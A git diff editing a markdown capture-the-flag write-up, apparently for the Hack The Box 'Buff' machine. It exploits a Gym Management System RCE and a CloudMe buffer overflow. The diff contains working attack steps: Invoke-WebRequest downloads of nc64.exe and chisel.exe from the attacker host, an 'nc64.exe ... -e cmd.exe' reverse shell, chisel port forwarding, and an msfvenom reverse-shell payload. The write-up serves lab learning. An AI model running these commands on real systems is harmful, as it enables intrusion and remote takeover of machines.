@@ -66,7 +66,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 Take a look at `http://10.10.10.198:8080`, we can find a subtitle that shows the running software and its version.
 ![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-29/2020-12-27-15-41-31.png)
 
-Using searchsploit, we can find a RCE [Gym Management System 1.0 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/48506).
+Using searchsploit, we can find an RCE [Gym Management System 1.0 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/48506).
 ```
 root@kali:~# searchsploit gym management
 --------------------------------------------------------------------------------- ---------------------------------
@@ -80,8 +80,9 @@ Gym Management System 1.0 - Unauthenticated Remote Code Execution               
 Shellcodes: No Results
 ```
 
-Download (or use the one installed on Kali by default) the exploit, install the prerequisites for python2 and execute.<br>
-We can confirm that we had a shell.
+Download (or use the one installed on Kali by default) the exploit, install the prerequisites for python2 and execute the script.<br>
+We can confirm that we had a shell execution.
+
 ```
 root@kali:~# python -m pip install requests
 
@@ -91,8 +92,6 @@ root@kali:~# python -m pip install colorama
 
 ---
 
-```
-```
 root@kali:~# python 48506.py http://10.10.10.198:8080/
             /\
 /vvvvvvvvvvvv \--------------------------------------,
@@ -108,6 +107,7 @@ buff\shaun
 
 We got a web shell but we still don't have OS shell.<br>
 Try to upload `nc64.exe` using Powershell after started local HTTP server that hosts [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------).
+#### On the localhost
 ```
 root@kali:~# ls | grep nc64
 nc64.exe
@@ -116,6 +116,8 @@ root@kali:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 
 ```
+
+#### On the target machine
 ```
 C:\xampp\htdocs\gym\upload> powershell Invoke-WebRequest -Uri http://10.10.14.42:8000/nc64.exe -OutFile C:\xampp\htdocs\gym\upload\nc64.exe
 �PNG
@@ -138,16 +140,22 @@ C:\xampp\htdocs\gym\upload> dir
 
 ```
 
-Launch a local netcat listener and execute the `nc64.exe`.<br>
+Launch a local netcat listener and execute `nc64.exe`.<br>
 Now we got a reverse shell as `shaun`.
+
+#### On the localhost
 ```
 root@kali:~# nc -nlvp 4443
 Listening on 0.0.0.0 4443
 
 ```
+
+#### On the target machine
 ```
 C:\xampp\htdocs\gym\upload> nc64.exe 10.10.14.42 4443 -e cmd.exe
 ```
+
+#### On the localhost
 ```
 root@kali:~# nc -nlvp 4443
 Listening on 0.0.0.0 4443
@@ -171,7 +179,7 @@ type user.txt
 
 ## 3. Getting Root
 
-In `hogehoge` directory, we can find an interesting binary called `CloudMe_1112.exe`.
+In `C:\Users\shaun\Downloads>` directory, we can find an interesting binary called `CloudMe_1112.exe`.
 ```
 C:\Users\shaun\Downloads>dir
 dir
@@ -215,13 +223,17 @@ CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                      
 Shellcodes: No Results
 ```
 
-Besides, we have to take a look at the default port of `hogehoge`.
+We have to take a look at the default port of `CloudMe`.
 We didn't see port 8888 during the port scanning because only `127.0.0.1` is allowed to use it
+
+#### On the localhost
 ```
 root@kali:~# cat 48389.py | grep connect
     s.connect((target,8888))
 
 ```
+
+#### On the target host
 ```
 C:\Users\shaun\Downloads>netstat -an
 netstat -an
@@ -252,6 +264,8 @@ Active Connections
 To use the exploit, we need port forwarding.<br>
 This time, [Chisel](https://github.com/jpillora/chisel) was used for the purpose.<br>
 Run a web server on the localhost, upload the windows binary and run on the target machine.
+
+#### On the localhost
 ```
 root@kali:~# chmod +x chisel
 root@kali:~# sudo ./chisel server -p 8001 --reverse -v
@@ -259,11 +273,6 @@ root@kali:~# sudo ./chisel server -p 8001 --reverse -v
 2020/12/29 12:52:49 server: Fingerprint 8fU8yodGKrxrXrjHCh9cAFAWAccwXWRyHQJCACbgB1g=
 2020/12/29 12:52:49 server: Listening on http://0.0.0.0:8001
 
-
-```
-
-
-```
 root@kali:~# ls | grep chisel
 chisel
 chisel.exe
@@ -272,19 +281,20 @@ root@kali:~# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ```
+
+#### On the target machine
 ```
 C:\Users\shaun\Downloads>powershell Invoke-WebRequest -Uri http://10.10.14.42:8000/chisel.exe -OutFile chisel.exe
 powershell Invoke-WebRequest -Uri http://10.10.14.42:8000/chisel.exe -OutFile chisel.exe
-
 
 C:\Users\shaun\Downloads>chisel.exe client 10.10.14.42:8001 R:8888:127.0.0.1:8888
 chisel.exe client 10.10.14.42:8001 R:8888:127.0.0.1:8888
 2020/12/29 04:03:11 client: Connecting to ws://10.10.14.42:8001
 2020/12/29 04:03:13 client: Connected (Latency 244.1625ms)
 
-
 ```
 
+#### On the localhost
 ```
 root@kali:~# sudo ./chisel server -p 8001 --reverse -v
 2020/12/29 12:52:49 server: Reverse tunnelling enabled
@@ -297,15 +307,15 @@ root@kali:~# sudo ./chisel server -p 8001 --reverse -v
 2020/12/29 12:55:10 server: session#1: tun: proxy#R:8888=>8888: Listening
 2020/12/29 12:55:10 server: session#1: tun: Bound proxies
 
-
 ```
 
+#### On the localhost (another window)
 ```
 root@kali:~# ss -antp | grep 8888
 LISTEN 0      4096                      *:8888                      *:*     users:(("chisel",pid=117962,fd=8))   
 ```
 
-Besides, we need to change the payload of the POC script.<br>
+We need to change the payload of the POC script.<br>
 Run the following command to generate it.
 ```
 root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -b '\x00\x0A\x0D' -v payload -f python
@@ -419,14 +429,19 @@ except Exception as e:
 	print(sys.exc_value)
 ```
 
+#### Localhost
 ```
 root@kali:~# nc -nlvp 4444
 Listening on 0.0.0.0 4444
 
 ```
+
+#### Localhost (another window)
 ```
 root@kali:~# python 48389.py 
 ```
+
+#### Localhost (netcat window)
 ```
 root@kali:~# nc -nlvp 4444
 Listening on 0.0.0.0 4444
